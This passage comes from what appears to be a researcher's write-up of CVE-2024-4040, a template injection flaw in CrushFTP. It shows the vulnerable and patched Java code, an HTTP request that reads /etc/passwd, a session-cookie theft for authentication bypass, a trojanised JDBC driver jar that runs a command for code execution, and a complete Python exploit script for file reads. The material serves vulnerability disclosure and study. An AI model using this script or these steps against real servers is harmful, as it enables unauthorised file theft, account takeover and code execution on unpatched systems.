uSG(user_info, \u0026#34;user_name\u0026#34;).equalsIgnoreCase(\u0026#34;anonymous\u0026#34;) ? uSG(user_info, \u0026#34;current_password\u0026#34;) : \u0026#34;\u0026#34;); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_current_dir\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_current_dir\u0026#34; + r2, the_session.get_PWD()); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_sessionid\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_sessionid\u0026#34; + r2, uSG(user_info, \u0026#34;CrushAuth\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_site_commands_text\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_site_commands_text\u0026#34; + r2, uSG(user, \u0026#34;site\u0026#34;)); [..snip..] If the given placeholder is something like {{ user_name }} , it will give the current user’s name which in this case will be anonymous as we will make the connection as a guest. This is a typical behavior of a template rendering as we commonly see in Jinja (Python’s flask) or Razor (.NET) templates.\nAs we can see, the given user_name has been replaced with current user’s name.\nThere are certain values which are being processed differently:\nTwo things that seems to be of interesting from exploitation point of view are \u0026lt;LIST\u0026gt; and \u0026lt;INCLUDE\u0026gt; and we see if such placeholders are passed to the change_vars_to_values_static method, it ends up calling get_dir_list and do_include_file_command respectively. Calling get_dir_list resulted in a failure:\nThe reason is rather clear why this happens, checking the method get_dir_list , we see that it only lists the files/folders from the user’s VFS (Virtual File Share) given that the anonymous user will not have any VFS configured for it, it does make sense why it failed simply:\npublic String get_dir_list(String in_str, SessionCrush the_session) throws Exception { String command = in_str.substring(in_str.indexOf(\u0026#34;\u0026lt;LIST\u0026gt;\u0026#34;) + 6, in_str.indexOf(\u0026#34;\u0026lt;/LIST\u0026gt;\u0026#34;)); String path = command.trim(); Vector list = new Vector(); if (!path.startsWith(the_session.user.getProperty(\u0026#34;root_dir\u0026#34;))) path = String.valueOf(the_session.user.getProperty(\u0026#34;root_dir\u0026#34;)) + path.substring(1); the_session.uVFS.getListing(list, path); StringBuffer add_str = new StringBuffer(); for (int x = 0; x \u0026lt; list.size(); x++) { Properties item = list.elementAt(x); LIST_handler.generateLineEntry(item, add_str, false, path, false, the_session, false); } in_str = Common.replace_str(in_str, \u0026#34;\u0026lt;LIST\u0026gt;\u0026#34; + command + \u0026#34;\u0026lt;/LIST\u0026gt;\u0026#34;, add_str.toString()); return in_str; } Arbitrary File Read Vulnerability via SSTI #Now, moving on to the do_include_file_command , let’s analyze the method:\npublic String do_include_file_command(String in_str) { try { String file_name = in_str.substring(in_str.indexOf(\u0026#34;\u0026lt;INCLUDE\u0026gt;\u0026#34;) + 9, in_str.indexOf(\u0026#34;\u0026lt;/INCLUDE\u0026gt;\u0026#34;)); RandomAccessFile includer = new RandomAccessFile((File)new File_S(file_name), \u0026#34;r\u0026#34;); byte[] temp_array = new byte[(int)includer.length()]; includer.read(temp_array); includer.close(); String include_data = String.valueOf(new String(temp_array)) + this.CRLF; return Common.replace_str(in_str, \u0026#34;\u0026lt;INCLUDE\u0026gt;\u0026#34; + file_name + \u0026#34;\u0026lt;/INCLUDE\u0026gt;\u0026#34;, include_data); } catch (Exception exception) { return in_str; } } Recalling that the disclosure for this vulnerability mentioned that VFS sandbox bypass meaning an attacker will be able to request any file on the system not just from the VFS. This is what made the vulnerability a rather severity one. In the above code snippet, we don’t see any explicit check against the given directory to be within the VFS like we saw in the get_dir_list , to give an overview, this method parses the given placeholder value, for example if \u0026lt;INCLUDE\u0026gt;/etc/passwd\u0026lt;/INCLUDE\u0026gt; , it will get the /etc/passwd and store it in the file_name and then using the [includer.read](http://includer.read) method, it will read that file and then return the retrieved content.\nLet’s test this out by reading the /etc/passwd file:\nGET /WebInterface/function/?command=zip\u0026amp;c2f=1QTL\u0026amp;path=\u0026lt;INCLUDE\u0026gt;/etc/passwd\u0026lt;/INCLUDE\u0026gt;\u0026amp;names=* HTTP/1.1 Host: localhost:8080 User-Agent: python-requests/2.31.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Cookie: currentAuth=1QTL; CrushAuth=1715144049924_XPU0xRbx1hIJZnsTuFUQ9l8wFI1QTL Retrieving the contents of /etc/passwd using the INCLUDE template.\nThis is the vulnerability which was mainly discussed everywhere but rather what happened here is the custom templating engine that CrushFTP has implemented and the INCLUDE which is a specified template for retrieving specific file. Since the direct call of this function does not check for files within the VFS allowing us to traverse through the whole file system.\nAuthentication Bypass via sessions.obj #Using this Arbitrary File read vulnerability, we can get the session cookies for the users by reading the sessions.obj , this file contains raw data and also stores session cookies for the logged in users. Once retrieved, one can extract the session cookies and then use it to access the CrushFTP functionalities. Leveraging to RCE #There was also a vague mention of how this vulnerability can open certain avenues to perform RCE. I walked through the application from the admin session to find if there is any specific functionalities which may let us achieve code execution. One of such functionalities was\nPreferences → Plugins → CrushSQL\nI tried to compile a jar file by having a Main.class file in it with the Driver as the public class name but it returned following error:\njava.lang.ClassCastException: class Main cannot be cast to class java.sql.Driver (Main is in unnamed module of loader java.net.URLClassLoader @62f16978; java.sql.Driver is in module java.sql of loader \u0026lsquo;platform\u0026rsquo;)\nThe error occurs because the class Driver is being incorrectly cast to the interface java.sql.Driver, suggesting an attempt to use Driver as a JDBC driver, which it is not, leading to a ClassCastException.\nSo in order to keep things simple, I downloaded the mysqlconnector jar file and then decompressed the jar file and then changed the Driver.class by adding my own code and then recompiled the .java file to class\nζ cat org/gjt/mm/mysql/Driver.java ackage org.gjt.mm.mysql; import java.io.IOException; import java.sql.SQLException; public class Driver extends com.mysql.jdbc.Driver { public Driver() throws SQLException { super(); // Call the constructor of the superclass // Your additional code here String cmd = \u0026#34;touch /tmp/curshftp_pwned\u0026#34;; try { Process process = Runtime.getRuntime().exec(cmd); process.waitFor(); } catch (IOException | InterruptedException e) { // Handle the exception as needed e.printStackTrace(); } } } ζ javac org/gjt/mm/mysql/Driver.java Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true Note: org/gjt/mm/mysql/Driver.java uses or overrides a deprecated API. Note: Recompile with -Xlint:deprecation for details. Once done, it is time to pack it back to jar again\nζ jar cvf exploit.jar . Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true added manifest ignoring entry META-INF/ adding: META-INF/INDEX.LIST(in = 383) (out= 159)(deflated 58%) ignoring entry META-INF/MANIFEST.MF adding: com/(in = 0) (out= 0)(stored 0%) adding: com/mysql/(in = 0) (out= 0)(stored 0%) adding: com/mysql/jdbc/(in = 0) (out= 0)(stored 0%) adding: com/mysql/jdbc/AssertionFailedException.class(in = 914) (out= 472)(deflated 48%) adding: com/mysql/jdbc/Blob.class(in = 3604) (out= 1757)(deflated 51%) adding: com/mysql/jdbc/BlobFromLocator$LocatorInputStream.class(in = 2116) (out= 1133)(deflated 46%) adding: com/mysql/jdbc/BlobFromLocator.class(in = 8472) (out= 4434)(deflated 47%) adding: com/mysql/jdbc/Buffer.class(in = 11778) (out= 5114)(deflated 56%) adding: com/mysql/jdbc/CallableStatement$CallableStatementParam.class(in = 1366) (out= 733)(deflated 46%) adding: com/mysql/jdbc/CallableStatement$CallableStatementParamInfo.class(in = 6435) (out= 2915)(deflated 54%) adding: com/mysql/jdbc/CallableStatement$CallableStatementParamInfoJDBC3.class(in = 1129) (out= 458)(deflated 59%) adding: com/mysql/jdbc/CallableStatement.class(in = 29764) (out= 11182)(deflated 62%) adding: com/mysql/jdbc/CharsetMapping.class(in = 11950) (out= 5943)(deflated 50%) adding: com/mysql/jdbc/Charsets.properties(in = 2477) (out= 861)(deflated 65%) adding: com/mysql/jdbc/Clob.class(in = 5148) (out= 2409)(deflated 53%) adding: com/mysql/jdbc/CommunicationsException.class(in = 3552) (out= 1703)(deflated 52%) adding: com/mysql/jdbc/CompressedInputStream.class(in = 4684) (out= 2555)(deflated 45%) adding: com/mysql/jdbc/Connection$1.class(in = 1135) (out= 686)(deflated 39%) adding: com/mysql/jdbc/Connection$CompoundCacheKey.class(in = 1326) (out= 728)(deflated 45%) adding: com/mysql/jdbc/Connection$UltraDevWorkAround.class(in = 20359) (out= 4395)(deflated 78%) adding: com/mysql/jdbc/Connection.class(in = 67031) (out= 33151)(deflated 50%) adding: com/mysql/jdbc/ConnectionFeatureNotAvailableException.class(in = 830) (out= 439)(deflated 47%) adding: com/mysql/jdbc/ConnectionProperties$1.class(in = 372) (out= 236)(deflated 36%) adding: com/mysql/jdbc/ConnectionProperties$BooleanConnectionProperty.class(in = 2243) (out= 1060)(deflated 52%) adding: com/mysql/jdbc/ConnectionProperties$ConnectionProperty.class(in = 5207) (out= 2337)(deflated 55%) adding: com/mysql/jdbc/ConnectionProperties$IntegerConnectionProperty.class(in = 3334) (out= 1468)(deflated 55%) adding: com/mysql/jdbc/ConnectionProperties$MemorySizeConnectionProperty.class(in = 2133) (out= 1104)(deflated 48%) adding: com/mysql/jdbc/ConnectionProperties$StringConnectionProperty.class(in = 2341) (out= 994)(deflated 57%) adding: com/mysql/jdbc/ConnectionProperties.class(in = 63336) (out= 22225)(deflated 64%) adding: com/mysql/jdbc/ConnectionPropertiesTransform.class(in = 283) (out= 184)(deflated 34%) adding: com/mysql/jdbc/Constants.class(in = 384) (out= 281)(deflated 26%) adding: com/mysql/jdbc/CursorRowProvider.class(in = 4730) (out= 2102)(deflated 55%) adding: com/mysql/jdbc/DatabaseMetaData$1.class(in = 3827) (out= 1962)(deflated 48%) adding: com/mysql/jdbc/DatabaseMetaData$2.class(in = 6158) (out= 3099)(deflated 49%) adding: com/mysql/jdbc/DatabaseMetaData$3.class(in = 5352) (out= 2531)(deflated 52%) adding: com/mysql/jdbc/DatabaseMetaData$4.class(in = 3378) (out= 1637)(deflated 51%) adding: com/mysql/jdbc/DatabaseMetaData$5.class(in = 3274) (out= 1617)(deflated 50%) adding: com/mysql/jdbc/DatabaseMetaData$6.class(in = 3274) (out= 1692)(deflated 48%) adding: com/mysql/jdbc/DatabaseMetaData$7.class(in = 3276) (out= 1626)(deflated 50%) adding: com/mysql/jdbc/DatabaseMetaData$8.class(in = 3818) (out= 1940)(deflated 49%) adding: com/mysql/jdbc/DatabaseMetaData$9.class(in = 4511) (out= 2347)(deflated 47%) adding: com/mysql/jdbc/DatabaseMetaData$IterateBlock.class(in = 1143) (out= 589)(deflated 48%) adding: com/mysql/jdbc/DatabaseMetaData$IteratorWithCleanup.class(in = 716) (out= 392)(deflated 45%) adding: com/mysql/jdbc/DatabaseMetaData$LocalAndReferencedColumns.class(in = 1066) (out= 530)(deflated 50%) adding: com/mysql/jdbc/DatabaseMetaData$ResultSetIterator.class(in = 1249) (out= 609)(deflated 51%) adding: com/mysql/jdbc/DatabaseMetaData$SingleStringIterator.class(in = 1121) (out= 562)(deflated 49%) adding: com/mysql/jdbc/DatabaseMetaData$TypeDescriptor.class(in = 4663) (out= 2634)(deflated 43%) adding: com/mysql/jdbc/DatabaseMetaData.class(in = 68855) (out= 27275)(deflated 60%) adding: com/mysql/jdbc/DatabaseMetaDataUsingInfoSchema.class(in = 15351) (out= 5479)(deflated 64%) adding: com/mysql/jdbc/DocsConnectionPropsHelper.class(in = 718) (out= 409)(deflated 43%) adding: com/mysql/jdbc/Driver.class(in = 692) (out= 426)(deflated 38%) adding: com/mysql/jdbc/EscapeProcessor.class(in = 11338) (out= 5906)(deflated 47%) adding: com/mysql/jdbc/EscapeProcessorResult.class(in = 462) (out= 313)(deflated 32%) adding: com/mysql/jdbc/EscapeTokenizer.class(in = 2138) (out= 1237)(deflated 42%) adding: com/mysql/jdbc/ExportControlled.class(in = 1980) (out= 1024)(deflated 48%) adding: com/mysql/jdbc/Field.class(in = 12253) (out= 5730)(deflated 53%) adding: com/mysql/jdbc/LicenseConfiguration.class(in = 502) (out= 315)(deflated 37%) adding: com/mysql/jdbc/LocalizedErrorMessages.properties(in = 21861) (out= 6062)(deflated 72%) adding: com/mysql/jdbc/Messages.class(in = 2744) (out= 1363)(deflated 50%) adding: com/mysql/jdbc/MiniAdmin.class(in = 1425) (out= 686)(deflated 51%) adding: com/mysql/jdbc/MysqlDataTruncation.class(in = 815) (out= 483)(deflated 40%) adding: com/mysql/jdbc/MysqlDefs.class(in = 7862) (out= 3812)(deflated 51%) adding: com/mysql/jdbc/MysqlErrorNumbers.class(in = 13677) (out= 5204)(deflated 61%) adding: com/mysql/jdbc/MysqlIO.class(in = 53305) (out= 27564)(deflated 48%) adding: com/mysql/jdbc/MysqlParameterMetadata.class(in = 2161) (out= 897)(deflated 58%) adding: com/mysql/jdbc/MysqlSavepoint.class(in = 1646) (out= 928)(deflated 43%) adding: com/mysql/jdbc/NamedPipeSocketFactory$NamedPipeSocket.class(in = 1881) (out= 805)(deflated 57%) adding: com/mysql/jdbc/NamedPipeSocketFactory$RandomAccessFileInputStream.class(in = 1339) (out= 619)(deflated 53%) adding: com/mysql/jdbc/NamedPipeSocketFactory$RandomAccessFileOutputStream.class(in = 1266) (out= 617)(deflated 51%) adding: com/mysql/jdbc/NamedPipeSocketFactory.class(in = 1978) (out= 909)(deflated 54%) adding: com/mysql/jdbc/NonRegisteringDriver.class(in = 9521) (out= 4561)(deflated 52%) adding: com/mysql/jdbc/NonRegisteringReplicationDriver.class(in = 2474) (out= 1257)(deflated 49%) adding: com/mysql/jdbc/NotImplemented.class(in = 480) (out= 301)(deflated 37%) adding: com/mysql/jdbc/NotUpdatable.class(in = 893) (out= 481)(deflated 46%) adding: com/mysql/jdbc/OperationNotSupportedException.class(in = 529) (out= 320)(deflated 39%) adding: com/mysql/jdbc/OutputStreamWatcher.class(in = 201) (out= 150)(deflated 25%) adding: com/mysql/jdbc/PacketTooBigException.class(in = 930) (out= 469)(deflated 49%) adding: com/mysql/jdbc/PreparedStatement$BatchParams.class(in = 1224) (out= 685)(deflated 44%) adding: com/mysql/jdbc/PreparedStatement$EndPoint.class(in = 647) (out= 375)(deflated 42%) adding: com/mysql/jdbc/PreparedStatement$ParseInfo.class(in = 4277) (out= 2447)(deflated 42%) adding: com/mysql/jdbc/PreparedStatement.class(in = 45810) (out= 22848)(deflated 50%) adding: com/mysql/jdbc/ReplicationConnection.class(in = 7733) (out= 2698)(deflated 65%) adding: com/mysql/jdbc/ReplicationDriver.class(in = 731) (out= 433)(deflated 40%) adding: com/mysql/jdbc/ResultSet.class(in = 82281) (out= 36039)(deflated 56%) adding: com/mysql/jdbc/ResultSetMetaData.class(in = 7948) (out= 3836)(deflated 51%) adding: com/mysql/jdbc/RowData.class(in = 970) (out= 473)(deflated 51%) adding: com/mysql/jdbc/RowDataDynamic$OperationNotSupportedException.class(in = 771) (out= 406)(deflated 47%) adding: com/mysql/jdbc/RowDataDynamic.class(in = 6083) (out= 2640)(deflated 56%) adding: com/mysql/jdbc/RowDataStatic.class(in = 2781) (out= 1186)(deflated 57%) adding: com/mysql/jdbc/SQLError.class(in = 15017) (out= 6323)(deflated 57%) adding: com/mysql/jdbc/Security.class(in = 4076) (out= 2342)(deflated 42%) adding: com/mysql/jdbc/ServerPreparedStatement$BatchedBindValues.class(in = 875) (out= 450)(deflated 48%) adding: com/mysql/jdbc/ServerPreparedStatement$BindValue.class(in = 2291) (out= 1184)(deflated 48%) adding: com/mysql/jdbc/ServerPreparedStatement.class(in = 35021) (out= 17081)(deflated 51%) adding: com/mysql/jdbc/SingleByteCharsetConverter.class(in = 3607) (out= 1913)(deflated 46%) adding: com/mysql/jdbc/SocketFactory.class(in = 380) (out= 235)(deflated 38%) adding: com/mysql/jdbc/StandardSocketFactory.class(in = 4324) (out= 2188)(deflated 49%) adding: com/mysql/jdbc/Statement$1.class(in = 1755) (out= 928)(deflated 47%) adding: com/mysql/jdbc/Statement$CachedResultSetMetaData.class(in = 747) (out= 427)(deflated 42%) adding: com/mysql/jdbc/Statement$CancelTask.class(in = 1228) (out= 630)(deflated 48%) adding: com/mysql/jdbc/Statement.class(in = 26505) (out= 12676)(deflated 52%) adding: com/mysql/jdbc/StringUtils.class(in = 17636) (out= 8909)(deflated 49%) adding: com/mysql/jdbc/TimeUtil.class(in = 34225) (out= 16486)(deflated 51%) adding: com/mysql/jdbc/UpdatableResultSet.class(in = 25663) (out= 11104)(deflated 56%) adding: com/mysql/jdbc/Util$RandStructcture.class(in = 565) (out= 348)(deflated 38%) adding: com/mysql/jdbc/Util.class(in = 5155) (out= 2894)(deflated 43%) adding: com/mysql/jdbc/VersionedStringProperty.class(in = 2174) (out= 1225)(deflated 43%) adding: com/mysql/jdbc/WatchableOutputStream.class(in = 794) (out= 417)(deflated 47%) adding: com/mysql/jdbc/WatchableWriter.class(in = 698) (out= 380)(deflated 45%) adding: com/mysql/jdbc/WriterWatcher.class(in = 183) (out= 143)(deflated 21%) adding: com/mysql/jdbc/configs/(in = 0) (out= 0)(stored 0%) adding: com/mysql/jdbc/configs/3-0-Compat.properties(in = 413) (out= 269)(deflated 34%) adding: com/mysql/jdbc/configs/clusterBase.properties(in = 100) (out= 88)(deflated 12%) adding: com/mysql/jdbc/configs/fullDebug.properties(in = 146) (out= 110)(deflated 24%) adding: com/mysql/jdbc/configs/maxPerformance.properties(in = 775) (out= 419)(deflated 45%) adding: com/mysql/jdbc/configs/solarisMaxPerformance.properties(in = 248) (out= 169)(deflated 31%) adding: com/mysql/jdbc/exceptions/(in = 0) (out= 0)(stored 0%) adding: com/mysql/jdbc/exceptions/MySQLDataException.class(in = 829) (out= 414)(deflated 50%) adding: com/mysql/jdbc/exceptions/MySQLIntegrityConstraintViolationException.class(in = 901) (out= 433)(deflated 51%) adding: com/mysql/jdbc/exceptions/MySQLInvalidAuthorizationSpecException.class(in = 889) (out= 434)(deflated 51%) adding: com/mysql/jdbc/exceptions/MySQLNonTransientConnectionException.class(in = 883) (out= 421)(deflated 52%) adding: com/mysql/jdbc/exceptions/MySQLNonTransientException.class(in = 822) (out= 417)(deflated 49%) adding: com/mysql/jdbc/exceptions/MySQLSyntaxErrorException.class(in = 850) (out= 422)(deflated 50%) adding: com/mysql/jdbc/exceptions/MySQLTimeoutException.class(in = 977) (out= 487)(deflated 50%) adding: com/mysql/jdbc/exceptions/MySQLTransactionRollbackException.class(in = 871) (out= 423)(deflated 51%) adding: com/mysql/jdbc/exceptions/MySQLTransientConnectionException.class(in = 871) (out= 419)(deflated 51%) adding: com/mysql/jdbc/exceptions/MySQLTransientException.class(in = 813) (out= 407)(deflated 49%) adding: com/mysql/jdbc/integration/(in = 0) (out= 0)(stored 0%) adding: com/mysql/jdbc/integration/c3p0/(in = 0) (out= 0)(stored 0%) adding: com/mysql/jdbc/integration/c3p0/MysqlConnectionTester.class(in = 2856) (out= 1427)(deflated 50%) adding: com/mysql/jdbc/integration/jboss/(in = 0) (out= 0)(stored 0%) adding: com/mysql/jdbc/integration/jboss/ExtendedMysqlExceptionSorter.class(in = 804) (out= 457)(deflated 43%) adding: com/mysql/jdbc/integration/jboss/MysqlValidConnectionChecker.class(in = 2687) (out= 1351)(deflated 49%) adding: com/mysql/jdbc/jdbc2/(in = 0) (out= 0)(stored 0%) adding: com/mysql/jdbc/jdbc2/optional/(in = 0) (out= 0)(stored 0%) adding: com/mysql/jdbc/jdbc2/optional/CallableStatementWrapper.class(in = 18436) (out= 4464)(deflated 75%) adding: com/mysql/jdbc/jdbc2/optional/ConnectionWrapper.class(in = 10762) (out= 3702)(deflated 65%) adding: com/mysql/jdbc/jdbc2/optional/MysqlConnectionPoolDataSource.class(in = 1259) (out= 531)(deflated 57%) adding: com/mysql/jdbc/jdbc2/optional/MysqlDataSource.class(in = 5785) (out= 2512)(deflated 56%) adding: com/mysql/jdbc/jdbc2/optional/MysqlDataSourceFactory.class(in = 3186) (out= 1625)(deflated 48%) adding: com/mysql/jdbc/jdbc2/optional/MysqlPooledConnection.class(in = 3122) (out= 1467)(deflated 53%) adding: com/mysql/jdbc/jdbc2/optional/MysqlXAConnection.class(in = 8107) (out= 4102)(deflated 49%) adding: com/mysql/jdbc/jdbc2/optional/MysqlXADataSource.class(in = 1396) (out= 622)(deflated 55%) adding: com/mysql/jdbc/jdbc2/optional/MysqlXAException.class(in = 1156) (out= 628)(deflated 45%) adding: com/mysql/jdbc/jdbc2/optional/MysqlXid.class(in = 1510) (out= 883)(deflated 41%) adding: com/mysql/jdbc/jdbc2/optional/PreparedStatementWrapper.class(in = 9557) (out= 2923)(deflated 69%) adding: com/mysql/jdbc/jdbc2/optional/StatementWrapper.class(in = 8635) (out= 2843)(deflated 67%) adding: com/mysql/jdbc/jdbc2/optional/SuspendableXAConnection.class(in = 3889) (out= 1679)(deflated 56%) adding: com/mysql/jdbc/jdbc2/optional/WrapperBase.class(in = 897) (out= 504)(deflated 43%) adding: com/mysql/jdbc/log/(in = 0) (out= 0)(stored 0%) adding: com/mysql/jdbc/log/CommonsLogger.class(in = 2725) (out= 911)(deflated 66%) adding: com/mysql/jdbc/log/Jdk14Logger.class(in = 4520) (out= 1852)(deflated 59%) adding: com/mysql/jdbc/log/Log.class(in = 489) (out= 261)(deflated 46%) adding: com/mysql/jdbc/log/Log4JLogger.class(in = 2752) (out= 987)(deflated 64%) adding: com/mysql/jdbc/log/LogFactory.class(in = 3130) (out= 1472)(deflated 52%) adding: com/mysql/jdbc/log/LogUtils.class(in = 3274) (out= 1891)(deflated 42%) adding: com/mysql/jdbc/log/NullLogger.class(in = 1908) (out= 561)(deflated 70%) adding: com/mysql/jdbc/log/StandardLogger.class(in = 4161) (out= 1727)(deflated 58%) adding: com/mysql/jdbc/profiler/(in = 0) (out= 0)(stored 0%) adding: com/mysql/jdbc/profiler/ProfileEventSink.class(in = 1835) (out= 928)(deflated 49%) adding: com/mysql/jdbc/profiler/ProfilerEvent.class(in = 5720) (out= 2800)(deflated 51%) adding: com/mysql/jdbc/util/(in = 0) (out= 0)(stored 0%) adding: com/mysql/jdbc/util/BaseBugReport.class(in = 2200) (out= 1089)(deflated 50%) adding: com/mysql/jdbc/util/ErrorMappingsDocGenerator.class(in = 581) (out= 348)(deflated 40%) adding: com/mysql/jdbc/util/LRUCache.class(in = 700) (out= 454)(deflated 35%) adding: com/mysql/jdbc/util/PropertiesDocGenerator.class(in = 721) (out= 423)(deflated 41%) adding: com/mysql/jdbc/util/ReadAheadInputStream.class(in = 4549) (out= 2490)(deflated 45%) adding: com/mysql/jdbc/util/ResultSetUtil.class(in = 1718) (out= 977)(deflated 43%) adding: com/mysql/jdbc/util/ServerController.class(in = 4914) (out= 2499)(deflated 49%) adding: com/mysql/jdbc/util/TimezoneDump.class(in = 1825) (out= 989)(deflated 45%) adding: com/mysql/jdbc/util/VersionFSHierarchyMaker.class(in = 3699) (out= 2113)(deflated 42%) adding: manifest.txt(in = 36) (out= 38)(deflated -5%) adding: org/(in = 0) (out= 0)(stored 0%) adding: org/gjt/(in = 0) (out= 0)(stored 0%) adding: org/gjt/mm/(in = 0) (out= 0)(stored 0%) adding: org/gjt/mm/mysql/(in = 0) (out= 0)(stored 0%) adding: org/gjt/mm/mysql/Driver.class(in = 699) (out= 459)(deflated 34%) adding: org/gjt/mm/mysql/Driver.java(in = 575) (out= 307)(deflated 46%) Once the jar is ready, we can now go back to the CrushSQL and configure the Database Driver file and save the settings. Once we clicked on “Test settings”, it will hang up for a second and throw the shown error but the command will be executed:\nWe can see that the file has been created:\nζ ls -la /tmp/crushftp_pwned -rw-r--r-- 1 root root 0 May 9 07:22 /tmp/crushftp_pwned I have made my own script which triggers the vulnerability and checks if the target CrushFTP is vulnerable or not and if it is, it will retrieve the specified file.\nUnfortunately, automating the RCE is not worth the effort in this case as it is multi-step process. Not that it cannot be automated with extra effort, it is just some dependency on the VFS share where you have uploaded the jar file have to be specified during the plugin configuration. It will not be scalable per se.\n#!/usr/bin/python3 import requests import argparse import re def check_vulnerability(url): try: sess = requests.Session() sess.get(url) currentAuth = sess.cookies[\u0026#39;currentAuth\u0026#39;] # Implement vulnerability check logic here print(\u0026#34;[*] Checking vulnerability for URL:\u0026#34;, url) response = sess.get(f\u0026#34;{url}/WebInterface/function/?command=zip\u0026amp;c2f=\u0026#34;+currentAuth+\u0026#34;\u0026amp;path={{user_name}}\u0026amp;names=*\u0026#34;) if \u0026#34;anonymous\u0026#34; in response.text: print(f\u0026#34;[+] URL: {url} is vulnerable to CVE 2024-4040\u0026#34;) return True else: print(\u0026#34;[-] Not vulnerable!\u0026#34;) return False except Exception as e: print(f\u0026#34;Error occured: \u0026#34;, e) return False def do_include_file_command(url, filename): # Implement LFI logic here check_vulnerability(url) print(\u0026#34;[*] Attempting to read file:\u0026#34;, filename) try: sess = requests.Session() sess.get(url) currentAuth = sess.cookies[\u0026#39;currentAuth\u0026#39;] response = sess.get(f\u0026#34;{url}/WebInterface/function/?command=zip\u0026amp;c2f=\u0026#34;+currentAuth+f\u0026#34;\u0026amp;path=\u0026lt;INCLUDE\u0026gt;{filename}\u0026lt;/INCLUDE\u0026gt;\u0026amp;names=*\u0026#34;) if filename in response.text: print(\u0026#34;[!] Filename found in response, the requested file may not exist\u0026#34;) print(response.text) else: print(response.text) return True except Exception as e: print(f\u0026#34;Error occured: \u0026#34;, e) return False def main(): parser = argparse.ArgumentParser(description=\u0026#34;Script to check for vulnerability and perform LFI on CrushFTP.\u0026#34;) parser.add_argument(\u0026#34;--check\u0026#34;, action=\u0026#34;store_true\u0026#34;, help=\u0026#34;Check if the remote instance is vulnerable or not\u0026#34;) parser.add_argument(\u0026#34;--lfi\u0026#34;, metavar=\u0026#34;FILENAME\u0026#34;, help=\u0026#34;Include a file from the remote instance\u0026#34;) parser.add_argument(\u0026#34;--url\u0026#34;, required=True, help=\u0026#34;Base URL of the CrushFTP instance\u0026#34;) args = parser.parse_args() print(\u0026#34;-\u0026#34;*0x30) print(\u0026#34;Exploit for CVE 2024-4040 - CrushFTP SSTI Vulnerability\u0026#34;) print(\u0026#34;Author: D4mianWayne (Robin)\u0026#34;) print(\u0026#34;Blog: https://d4mianwayne.github.io\\n\u0026#34;) print(\u0026#34;-\u0026#34;*0x30 + \u0026#34;\\n\u0026#34;) if args.check: check_vulnerability(args.url) if args.lfi: do_include_file_command(args.url, args.lfi) if __name__ == \u0026#39;__main__\u0026#39;: main() The exploit script and the exploit.jar (used for RCE) can be found here.\nPatch #The CrushFTP developers fixed this in 11.1.0 and 10.6.0 versions. Checking the writeResponse method, we clearly see that the function which was previously being called has been changed, it is now renamed to change_user_safe_vars_to_values_static , previously it was change_vars_to_values\npublic boolean writeResponse(String response) throws Exception { return this.writeResponse(response, true, 200, true, false, true); } public boolean writeResponse(String response, boolean json) throws Exception { return this.writeResponse(response, true, 200, true, json, true); } public boolean writeResponse(String response, boolean log, int code, boolean convertVars, boolean json, boolean log_header) throws Exception { boolean acceptsGZIP = false; return this.writeResponse(response, log, code, convertVars, json, acceptsGZIP, log_header); } public boolean writeResponse(String response, boolean log, int code, boolean convertVars, boolean json, boolean acceptsGZIP, boolean log_header) throws Exception { if (convertVars \u0026amp;\u0026amp; this.thisSessionHTTP.thisSession != null) { response = ServerStatus.change_user_safe_vars_to_values_static(response, this.thisSessionHTTP.thisSession.user, this.thisSessionHTTP.thisSession.user_info, this.thisSessionHTTP.thisSession); } And checking the change_user_safe_vars_to_values_static , we see that there are two new lines added to the start of this function:\nif (in_str.indexOf(\u0026#39;%\u0026#39;) \u0026lt; 0 \u0026amp;\u0026amp; in_str.indexOf(\u0026#39;{\u0026#39;) \u0026lt; 0 \u0026amp;\u0026amp; in_str.indexOf(\u0026#39;}\u0026#39;) \u0026lt; 0 \u0026amp;\u0026amp; in_str.indexOf(\u0026#39;\u0026lt;\u0026#39;) \u0026lt; 0) return in_str; We can see that it checks the given string if it contains either of following characters:\n{}%\u0026lt; More so, this function does not even check for INCLUDE or any other such tags for that matter basically mitigating any chances of invoking those.\npublic static String change_user_safe_vars_to_values_static(String in_str, Properties user, Properties user_info, SessionCrush the_session) { try { if (in_str.indexOf(\u0026#39;%\u0026#39;) \u0026lt; 0 \u0026amp;\u0026amp; in_str.indexOf(\u0026#39;{\u0026#39;) \u0026lt; 0 \u0026amp;\u0026amp; in_str.indexOf(\u0026#39;}\u0026#39;) \u0026lt; 0 \u0026amp;\u0026amp; in_str.indexOf(\u0026#39;\u0026lt;\u0026#39;) \u0026lt; 0) return in_str; String r1 = \u0026#34;%\u0026#34;; String r2 = \u0026#34;%\u0026#34;; for (int r = 0; r \u0026lt; 2; r++) { if (in_str.indexOf(r1) \u0026gt;= 0) in_str = parse_server_messages(in_str); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;server_time_date\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;server_time_date\u0026#34; + r2, (new Date()).toString()); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;login_number\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;login_number\u0026#34; + r2, uSG(user_info, \u0026#34;user_number\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_password\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_password\u0026#34; + r2, uSG(user_info, \u0026#34;current_password\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_name\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_name\u0026#34; + r2, uSG(user, \u0026#34;username\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_anonymous_password\u0026#34; + r2) \u0026gt;= 0) in_str 